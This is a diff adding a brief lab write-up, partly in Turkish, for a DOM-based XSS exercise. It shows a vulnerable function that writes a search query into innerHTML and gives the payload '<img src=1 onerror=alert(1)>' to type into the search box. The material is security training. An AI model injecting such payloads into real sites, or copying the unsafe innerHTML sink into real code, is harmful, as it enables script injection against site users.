@@ -1,0 +1,8 @@
+LAB: DOM XSS in innerHTML sink using source location.search
+
+function doSearchQuery(query) {
+    document.getElementById('searchMessage').innerHTML = query;
+}
+
+1 - Aşağıdaki payloadı arama yerine yazın.
+<img src=1 onerror=alert(1)>
